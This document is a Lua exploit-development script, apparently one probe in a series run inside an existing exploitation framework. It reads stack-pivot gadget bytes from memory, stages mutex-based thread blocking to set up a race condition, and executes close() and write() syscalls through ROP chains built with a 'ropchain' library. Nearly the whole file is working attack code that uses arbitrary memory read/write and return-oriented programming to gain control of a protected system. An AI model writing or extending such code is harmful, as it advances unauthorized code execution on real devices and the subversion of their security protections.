-- CRASH_CLASS: LOW
-- PROBE 127b: Read pivot gadget bytes + mutex thread blocking test
-- We need to understand the stack pivot to give threads ROP chains

print("=== PROBE 127b: PIVOT + MUTEX ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Read pivot gadget bytes
print("--- SECTION A: PIVOT GADGETS ---")
local pivots = gadgets.stack_pivot
for i, sp in ipairs(pivots) do
    print(string.format("pivot[%d]: gadget=0x%X base=0x%X",
        i, to_num(sp.gadget_addr), to_num(sp.pivot_base)))
    -- Read 16 bytes at gadget_addr
    local bytes = {}
    for off = 0, 15 do
        local ok, b = pcall(memory.read_byte, sp.gadget_addr + off)
        if ok then
            bytes[#bytes+1] = string.format("%02X", to_num(b))
        else
            bytes[#bytes+1] = "??"
            break
        end
    end
    print("  bytes: " .. table.concat(bytes, " "))
end

-- Also check the pivot_addr field
for i, sp in ipairs(pivots) do
    if sp.pivot_addr then
        print(string.format("pivot[%d] pivot_addr=0x%X", i, to_num(sp.pivot_addr)))
    end
end

-- Section B: Read native.lua's native_invoke setup code to understand pivot usage
print("")
print("--- SECTION B: NATIVE INVOKE INFO ---")
if native_invoke then
    print("native_invoke type=" .. type(native_invoke))
    local di = debug.getinfo(native_invoke, "SLnu")
    if di then
        print("  source=" .. tostring(di.source) .. " lines=" .. di.linedefined .. "-" .. di.lastlinedefined)
    end
end
if native_cmd_handler then
    print("native_cmd_handler=" .. tostring(native_cmd_handler))
end

-- Section C: Test mutex-based thread blocking
print("")
print("--- SECTION C: MUTEX THREAD BLOCKING ---")
local shared = memory.alloc(64)
memory.write_qword(shared, 0)  -- thread writes here
memory.write_qword(shared + 8, 0)  -- timestamp

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- Create and init a mutex
local mtx = memory.alloc(64)
local mtx_init = fcall(libc_addrofs.Mtx_init)
local mtx_lock = fcall(libc_addrofs.Mtx_lock)
local mtx_unlock = fcall(libc_addrofs.Mtx_unlock)

local ok_init = pcall(mtx_init, mtx, uint64(0))  -- mtx_plain = 0
print("Mtx_init: " .. tostring(ok_init))

-- Lock in main thread
local ok_lock = pcall(mtx_lock, mtx)
print("Mtx_lock(main): " .. tostring(ok_lock))

-- Write proof that main has lock
memory.write_qword(shared, uint64(0x1111))
print("shared[0]=0x1111 (main holds lock)")

-- Create thread that tries to lock
local thr_buf = memory.alloc(8)
memory.write_qword(thr_buf, 0)
local ok_create, ret_create = pcall(thrd_create_fn, thr_buf, libc_addrofs.Mtx_lock, mtx)
print("Thrd_create(Mtx_lock): ok=" .. tostring(ok_create) .. " ret=" .. tostring(ret_create))

if ok_create and to_num(ret_create) == 0 then
    -- Thread should be blocked
    sleep(0.2, 's')

    -- Verify thread is still blocked (shared shouldn't have changed)
    print("After 200ms: thread blocked? shared[0]=" .. tostring(memory.read_qword(shared)))

    -- Now do some work while thread is blocked
    -- This simulates our side of a race condition
    memory.write_qword(shared, uint64(0x2222))
    print("Main thread working... shared[0]=0x2222")

    -- Unlock - thread wakes up
    print("Unlocking mutex...")
    pcall(mtx_unlock, mtx)

    -- Give thread time to wake and run
    sleep(0.2, 's')

    -- Join
    local thr_id = memory.read_qword(thr_buf)
    local ok_join = pcall(thrd_join_fn, thr_id, uint64(0))
    print("Thrd_join: " .. tostring(ok_join))
    print("Final shared[0]=" .. tostring(memory.read_qword(shared)))
end

-- Section D: Test creating a thread that calls close() on a fd
-- We need to find if close has a C wrapper we can use
-- Approach: use fcall to get the close function address from syscall.close
print("")
print("--- SECTION D: SYSCALL CLOSE INFO ---")
if syscall.close then
    print("syscall.close type=" .. type(syscall.close))
    print("syscall.close.fn_addr=" .. tostring(syscall.close.fn_addr))
    print("syscall.close.syscall_no=" .. tostring(syscall.close.syscall_no))
end

-- Read the fn_addr bytes (it's in libkernel, might be XO)
local fn_addr = syscall.close.fn_addr
print("fn_addr=" .. tostring(fn_addr))
local ok_read, b0 = pcall(memory.read_byte, fn_addr)
print("readable: " .. tostring(ok_read))

-- Section E: Try close via ropchain in main thread
print("")
print("--- SECTION E: CLOSE VIA ROPCHAIN ---")
-- Create a test pipe
local rd, wr = create_pipe()
print("pipe: rd=" .. rd .. " wr=" .. wr)

-- Close rd via ropchain
local sc_close = make_sc(6)
local chain = ropchain:new()
chain:push_syscall_with_ret(sc_close, rd)
chain:restore_through_longjmp()
chain:execute_through_coroutine()
local ret_addr = chain:get_last_retval_addr()
if ret_addr then
    print("close(rd) ret=" .. to_num(memory.read_qword(ret_addr)))
end

-- Verify rd is closed
local sc_write = make_sc(4)
local test_buf = memory.alloc(8)
memory.write_qword(test_buf, uint64(0x4141))
local chain2 = ropchain:new()
chain2:push_syscall_with_ret(sc_write, rd, test_buf, 1)
chain2:restore_through_longjmp()
chain2:execute_through_coroutine()
local ret_addr2 = chain2:get_last_retval_addr()
if ret_addr2 then
    local wr_ret = to_num(memory.read_qword(ret_addr2))
    print("write(closed_rd) ret=" .. wr_ret .. " (expected -1)")
end

-- Cleanup
syscall.close(wr)

print("canary: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 127b COMPLETE ===")
